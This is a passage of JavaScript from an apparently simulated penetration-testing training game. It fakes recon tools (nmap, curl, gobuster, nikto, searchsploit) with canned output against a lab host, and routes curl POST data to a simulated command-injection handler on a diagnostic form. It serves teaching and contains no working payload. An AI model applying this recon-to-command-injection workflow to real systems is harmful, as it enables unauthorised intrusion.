            if (target === 'localhost' || target === '127.0.0.1') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00012s latency).
All 1000 scanned ports on localhost are closed.

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds`;
            }
            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
        },

        'curl': function(args, term, engine) {
            const url = args.find(a => !a.startsWith('-')) || '';
            if (!url) return 'curl: try \'curl --help\' for more information';

            // Detect POST with -d or --data
            const isPost = args.includes('-X') && args.includes('POST') ||
                           args.some(a => a === '-d' || a === '--data');

            // ── POST to /monitor/tools/ — command injection via curl ──
            if (url.includes('10.10.14.12') && url.includes('/monitor/tools') && isPost) {
                const dataIdx = args.findIndex(a => a === '-d' || a === '--data');
                const postData = dataIdx >= 0 ? args[dataIdx + 1] || '' : '';

                // Parse tool= and host= from POST data
                const toolMatch = postData.match(/tool=([^&]*)/);
                const hostMatch = postData.match(/host=([^&]*)/);
                const tool = toolMatch ? decodeURIComponent(toolMatch[1]) : 'ping';
                const host = hostMatch ? decodeURIComponent(hostMatch[1]) : '';

                if (!host) return 'Error: Please provide host parameter';

                // Run through injection engine
                const result = A3Config._handleDiagnostic({ tool, host }, engine);
                return A3Config._stripHtml(result);
            }

            // ── GET requests to web app ──
            if (url.includes('10.10.14.12') && url.includes('/monitor/tools')) {
                return `<!DOCTYPE html>
<html>
<head><title>Diagnostic Tools - Iron Bastion</title></head>
<body>
<h1>Network Diagnostic Tools</h1>
<form method="POST" action="/monitor/tools/">
  <select name="tool">
    <option value="ping">Ping</option>
    <option value="traceroute">Traceroute</option>
  </select>
  <input name="host" placeholder="IP Address or Hostname">
  <button type="submit">Run Diagnostic</button>
</form>
</body>
</html>`;
            }

            if (url.includes('10.10.14.12') && url.includes('/monitor/logs')) {
                return `<!DOCTYPE html>
<html>
<head><title>Access Logs - Iron Bastion</title></head>
<body>
<h1>Access Logs</h1>
<pre>
10.10.14.12 - - [14/Mar/2024:09:12:03 +0000] "GET /monitor/ HTTP/1.1" 200 4521
192.168.1.50 - monitor_svc [14/Mar/2024:09:15:00 +0000] "GET /monitor/api/health HTTP/1.1" 200 64
</pre>
</body>
</html>`;
            }

            if (url.includes('10.10.14.12') && url.includes('/monitor/api')) {
                return `<!DOCTYPE html>
<html><head><title>403 Forbidden</title></head>
<body><h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>`;
            }

            if (url.includes('10.10.14.12') && url.includes('/monitor')) {
                return `<!DOCTYPE html>
<html>
<head><title>Iron Bastion System Monitor</title></head>
<body>
<h1>Iron Bastion System Monitor</h1>
<p>Infrastructure Monitoring Dashboard v3.2.1</p>
<ul>
  <li><a href="/monitor/tools/">Diagnostic Tools</a></li>
  <li><a href="/monitor/logs/">Access Logs</a></li>
</ul>
<p>Server: iron-bastion | Uptime: 47d 12h 33m</p>
</body>
</html>`;
            }

            return `curl: (7) Failed to connect to ${url.replace(/https?:\/\//, '').split('/')[0] || 'host'}: Connection refused`;
        },

        'dirb': function(args, term, engine) {
            const target = args[0] || '';
            if (!target) return 'Usage: dirb <url_base> [<wordlist_file>]';

            return `---- Scanning URL: ${target} ----
+ ${target}/index.html (CODE:200|SIZE:4521)
+ ${target}/tools/ (CODE:200|SIZE:2103)
+ ${target}/logs/ (CODE:200|SIZE:3201)
+ ${target}/api/ (CODE:403|SIZE:276)
+ ${target}/config.php (CODE:403|SIZE:276)
+ ${target}/assets/ (CODE:200|SIZE:512)

---- Results ----
6 results found.`;
        },

        'gobuster': function(args) {
            return `Gobuster v3.6
[+] Url:            http://10.10.14.12/monitor/
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
===============================================================
/api/                (Status: 403) [Size: 276]
/assets/             (Status: 200) [Size: 512]
/config.php          (Status: 403) [Size: 276]
/index.html          (Status: 200) [Size: 4521]
/logs/               (Status: 200) [Size: 3201]
/tools/              (Status: 200) [Size: 2103]
===============================================================
Finished`;
        },

        'nikto': function(args) {
            return `- Nikto v2.5.0
+ Target IP:       10.10.14.12
+ Target Hostname:  iron-bastion
+ Target Port:      80
+ Server: Apache/2.4.57 (Ubuntu)
+ /monitor/tools/: OS command injection possible via 'host' parameter
+ /monitor/api/: Directory listing denied (403)
+ /monitor/config.php: Configuration file found (403)
+ Apache/2.4.57 appears to be outdated (current: 2.4.62)
+ OSVDB-3092: /monitor/logs/: Log file directory found
+ 8 items checked: 4 findings`;
        },

        'ping': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: ping [-c count] destination';
            if (target === '10.10.14.12') {
                return `PING 10.10.14.12 (10.10.14.12) 56(84) bytes of data.
64 bytes from 10.10.14.12: icmp_seq=1 ttl=64 time=28.3 ms
64 bytes from 10.10.14.12: icmp_seq=2 ttl=64 time=27.9 ms
64 bytes from 10.10.14.12: icmp_seq=3 ttl=64 time=28.7 ms

--- 10.10.14.12 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 27.9/28.3/28.7/0.327 ms`;
            }
            return `ping: ${target}: Name or service not known`;
        },

        'traceroute': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: traceroute host';
            if (target === '10.10.14.12') {
                return `traceroute to 10.10.14.12 (10.10.14.12), 30 hops max, 60 byte packets
 1  gateway (10.10.14.1)  0.542 ms  0.621 ms  0.712 ms
 2  10.10.14.1 (10.10.14.1)  1.203 ms  1.318 ms  1.402 ms
 3  10.10.14.12 (10.10.14.12)  2.105 ms  2.213 ms  2.301 ms`;
            }
            return `traceroute: ${target}: Name or service not known`;
        },

        'wget': function(args) {
            const url = args.find(a => !a.startsWith('-')) || '';
            if (!url) return 'Usage: wget [OPTION]... [URL]...';
            if (url.includes('10.10.14.12')) {
                const filename = url.split('/').filter(Boolean).pop() || 'index.html';
                return `--2024-03-14 09:30:15--  ${url}
Resolving 10.10.14.12... 10.10.14.12
Connecting to 10.10.14.12:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4521 (4.4K) [text/html]
Saving to: '${filename}'

${filename}         100%[===================>]   4.4K  --.-KB/s    in 0s

2024-03-14 09:30:15 (45.2 MB/s) - '${filename}' saved [4521/4521]`;
            }
            return `--2024-03-14 09:30:15--  ${url}\nResolving ${url.replace(/https?:\/\//, '').split('/')[0]}... failed: Name or service not known.`;
        },

        'searchsploit': function(args) {
            const query = args.join(' ');
            if (!query) return 'Usage: searchsploit <search_term>';
            if (query.toLowerCase().includes('apache') || query.toLowerCase().includes('command injection')) {
                return `--------------------------------------- ---------------------------------
 Exploit Title                         |  Path
--------------------------------------- ---------------------------------
 Apache 2.4.x - mod_cgi Command Inj.  | linux/webapps/51193.py
 PHP - OS Command Injection (CGI)      | php/webapps/45161.py
 Diagnostic Tools - Command Injection  | php/webapps/48721.txt
--------------------------------------- ---------------------------------
Shellcodes: No Results`;
            }
            return `--------------------------------------- ---------------------------------
 Exploit Title                         |  Path
--------------------------------------- ---------------------------------
No Results
--------------------------------------- ---------------------------------`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#2ecc71; border-bottom:2px solid #333; background:#1a2332;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #222;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        // Convert tables to text
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }
};
